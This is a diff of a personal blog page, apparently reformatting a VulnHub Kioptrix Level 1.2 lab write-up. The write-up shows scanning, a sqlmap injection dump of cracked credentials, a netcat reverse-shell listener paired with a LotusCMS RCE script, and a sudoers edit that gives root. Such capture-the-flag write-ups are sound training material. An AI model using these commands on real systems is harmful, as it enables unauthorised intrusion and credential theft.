@@ -1,4 +1,49 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] Kioptrix: Level 1.2 (#3)</h1><p><a href=/posts/20190928_vulnhub-kioptrix2.html> « </a>📅 published on <code>29/Sep/2019</code><a href=/posts/20191008_vulnhub-kioptrix4.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ >Kioptrix: Level 1.2 (#3)</a>. Here are stats for this machine from <a href=https://github.com/7h3rAm/machinescli>machinescli</a>:</p><p class=nested><img alt=writeup.overview.machinescli src=/static/files/posts_vulnhub_kioptrix3/machinescli.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_kioptrix3/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href=https://github.com/7h3rAm/writeups#exploit_lotuscms>exploit_lotuscms</a>, <a href=https://github.com/7h3rAm/writeups#privesc_sudoers>privesc_sudoers</a>, <a href=https://github.com/7h3rAm/writeups#privesc_sudo>privesc_sudo</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Sat Sep 28 20:47:08 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/xml/_quick_tcp_nmap.xml 192.168.92.184
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" class="menu_home">मंथन</a></td><td> | </td>
+          <td><a href="/archive.html" class="menu_archive">Archive</a></td><td> | </td>
+          <td><a href="/tags.html" class="menu_tags">Tags</a></td><td> | </td>
+          <td><a href="/stats.html" class="menu_stats">Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[VulnHub] Kioptrix: Level 1.2 (#3)</h1>
+                  <p><a href="/posts/20190928_vulnhub-kioptrix2.html"> « </a>📅 published on <code>29/Sep/2019</code><a href="/posts/20191008_vulnhub-kioptrix4.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix3/machinescli.png.webp" /></p>
+<h3>Killchain</h3>
+<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix3/killchain.png.webp" /></p>
+<h3>TTPs</h3>
+<p>1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_lotuscms">exploit_lotuscms</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>  </p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Sat Sep 28 20:47:08 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/xml/_quick_tcp_nmap.xml 192.168.92.184
 Nmap scan report for 192.168.92.184
 Host is up, received arp-response (0.00090s latency).
 Scanned at 2019-09-28 20:47:09 PDT for 9s
@@ -27,10 +72,22 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Sep 28 20:47:18 2019 -- 1 IP address (1 host up) scanned in 10.35 seconds
-</code></pre><p class=nested>2. Here a summary of open ports and associated <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> scan files:</p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_kioptrix3/openports.png.webp> </p><p class=nested>3. We added an entry for this target within <code>/etc/hosts</code> file: </p><pre class=nested><code>tail -2 /etc/hosts
+</code></pre>
+<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/openports.png.webp" />  </p>
+<p>3. We added an entry for this target within <code>/etc/hosts</code> file:  </p>
+<pre><code>tail -2 /etc/hosts
   192.168.92.184  kioptrix3.com
-</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp> </p><p class=nested>4. We find a login page at the following url: <code>http://kioptrix3.com/index.php?system=Admin</code> </p><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp> </p><p class=nested>5. We find that the underlying CMS is <code>LotusCMS</code> and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for <code>LotusCMS</code>: </p><pre class=nested><code>searchsploit lotuscms
-</code></pre><p class=nested><img alt=writeup.enumeration.steps.5.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp> </p><p class=nested>6. We also find a gallery application hosted on the following url: <code>http://kioptrix3.com/gallery/</code>. We test this application for SQLi using <code>sqlmap</code> and are able to dump the <code>dev_accounts</code> table from the <code>gallery</code> database. This table lists unsalted MD5 hashes for users <code>dreg</code> and <code>loneferret</code> that are auto-cracked by <code>sqlmap</code>: </p><pre class=nested><code>sqlmap --batch -u &quot;http://kioptrix3.com/gallery/gallery.php?id=null&quot; --dump
+</code></pre>
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp" />  </p>
+<p>4. We find a login page at the following url: <code>http://kioptrix3.com/index.php?system=Admin</code>  </p>
+<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp" />  </p>
+<p>5. We find that the underlying CMS is <code>LotusCMS</code> and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for <code>LotusCMS</code>:  </p>
+<pre><code>searchsploit lotuscms
+</code></pre>
+<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp" />  </p>
+<p>6. We also find a gallery application hosted on the following url: <code>http://kioptrix3.com/gallery/</code>. We test this application for SQLi using <code>sqlmap</code> and are able to dump the <code>dev_accounts</code> table from the <code>gallery</code> database. This table lists unsalted MD5 hashes for users <code>dreg</code> and <code>loneferret</code> that are auto-cracked by <code>sqlmap</code>:  </p>
+<pre><code>sqlmap --batch -u &quot;http://kioptrix3.com/gallery/gallery.php?id=null&quot; --dump
   Database: gallery
   Table: dev_accounts
   [2 entries]
@@ -40,14 +97,31 @@ Service detection performed. Please report any incorrect results at https://nmap
   | 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
   | 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
   +----+------------+---------------------------------------------+
-</code></pre><p class=nested><img alt=writeup.enumeration.steps.6.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.6.2 src=/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp  |  ssh   |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+</code></pre>
+<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp" />  </p>
+<p><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports</h4>
+<pre><code>22/tcp  |  ssh   |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 80/tcp  |  http  |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
-</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>lotuscms: dreg, loneferret
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We find a remote code execution <a href=https://github.com/Hood3dRob1n/LotusCMS-Exploit>exploit on GitHub</a> for <code>LotusCMS</code> and decide to use it. This exploit gives us a reverse shell that we can catch using <code>netcat</code>: </p><pre class=nested><code>nc -nlvp 443
+</code></pre>
+<h4>Users</h4>
+<pre><code>lotuscms: dreg, loneferret
+</code></pre>
+<h2>Phase #2: Exploitation</h2>
+<p>1. We find a remote code execution <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">exploit on GitHub</a> for <code>LotusCMS</code> and decide to use it. This exploit gives us a reverse shell that we can catch using <code>netcat</code>:  </p>
+<pre><code>nc -nlvp 443
 ./lotusRCE.sh kioptrix3.com
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot05a.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_kioptrix3/screenshot05b.png.webp> </p><p class=nested>2. We can also <code>ssh</code> as users <code>dreg</code> or <code>loneferret</code> into the target system using the credentials we dumped from the <code>LotusCMS</code> database. This is possible because these users have reused their CMS credentials for local system access: </p><pre class=nested><code>ssh dreg@192.168.92.184
+</code></pre>
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot05a.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot05b.png.webp" />  </p>
+<p>2. We can also <code>ssh</code> as users <code>dreg</code> or <code>loneferret</code> into the target system using the credentials we dumped from the <code>LotusCMS</code> database. This is possible because these users have reused their CMS credentials for local system access:  </p>
+<pre><code>ssh dreg@192.168.92.184
 ssh loneferret@192.168.92.184
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot06.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>loneferret@Kioptrix3&gt; id
+</code></pre>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot06.png.webp" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>loneferret@Kioptrix3&gt; id
 uid=1000(loneferret) gid=100(users) groups=100(users)
 loneferret@Kioptrix3&gt;  
 loneferret@Kioptrix3&gt; uname
@@ -64,18 +138,61 @@ loneferret@Kioptrix3&gt; users
 root
 loneferret
 dreg
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. We continue as user <code>loneferret</code> since this user has an interesting <code>sudo</code> entry: </p><pre class=nested><code>sudo -l
+</code></pre>
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. We continue as user <code>loneferret</code> since this user has an interesting <code>sudo</code> entry:  </p>
+<pre><code>sudo -l
   User loneferret may run the following commands on this host:
     (root) NOPASSWD: !/usr/bin/su
     (root) NOPASSWD: /usr/local/bin/ht
-</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot07.png.webp> </p><p class=nested>2. We find that the user <code>loneferret</code> can run the <code>ht</code> editor with <code>sudo</code> privileges and as such can modify any system file. We decide to open the <code>/etc/sudoers</code> file and edit the entry for user <code>loneferret</code> and give this user unrestricted <code>sudo</code> access: </p><pre class=nested><code>sudo ht
+</code></pre>
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot07.png.webp" />  </p>
+<p>2. We find that the user <code>loneferret</code> can run the <code>ht</code> editor with <code>sudo</code> privileges and as such can modify any system file. We decide to open the <code>/etc/sudoers</code> file and edit the entry for user <code>loneferret</code> and give this user unrestricted <code>sudo</code> access:  </p>
+<pre><code>sudo ht
   /etc/sudoers
     loneferret ALL=(ALL) ALL
-</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot08.png.webp> </p><p class=nested>3. Once the above changeas are done, we can now switch to <code>root</code> to complete the challenge: </p><pre class=nested><code>sudo su
-</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_kioptrix3/screenshot09.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_vulnhub_kioptrix3/screenshot10.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:............
+</code></pre>
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot08.png.webp" />  </p>
+<p>3. Once the above changeas are done, we can now switch to <code>root</code> to complete the challenge:  </p>
+<pre><code>sudo su
+</code></pre>
+<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot09.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot10.png.webp" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:............
 loneferret:$1$qbkHf53U$r.kK/JgDLDcXGRC6xUfB11:15079.............
 dreg:$1$qAc2saWZ$Y567sEs.ql3GMttI6pvoe0:15080:............
-</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>lotuscms: dreg/Mas..., loneferret/star....
+</code></pre>
+<h3>Credentials</h3>
+<pre><code>lotuscms: dreg/Mas..., loneferret/star....
 mysql: root/fucke...
 ssh: dreg/Mas..., loneferret/star....
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ >https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a> </li><li><a href=https://v3ded.github.io/ctf/kioptrix3.html>https://v3ded.github.io/ctf/kioptrix3.html</a> </li><li><a href=https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub>https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190928_vulnhub-kioptrix2.html>[VulnHub] Kioptrix: Level 1.1 ...</a> « | » <a href=/posts/20191008_vulnhub-kioptrix4.html>[VulnHub] Kioptrix: Level 1.3 ...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
+</code></pre>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a>  </li>
+<li><a href="https://v3ded.github.io/ctf/kioptrix3.html">https://v3ded.github.io/ctf/kioptrix3.html</a>  </li>
+<li><a href="https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub">https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub</a>  </li>
+</ul>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190928_vulnhub-kioptrix2.html">[VulnHub] Kioptrix: Level 1.1 ...</a> « | » <a href="/posts/20191008_vulnhub-kioptrix4.html">[VulnHub] Kioptrix: Level 1.3 ...</a> »</p>
+            </div>
+    <div class="footer footercenter">
+      <span>
+        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+      </span>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(s){
+        s.classList.toggle("expanded");
+        for(var l=s.nextElementSibling;l;){
+          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+        }
+      }
+    </script>
+    <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+  </body>
+</html>
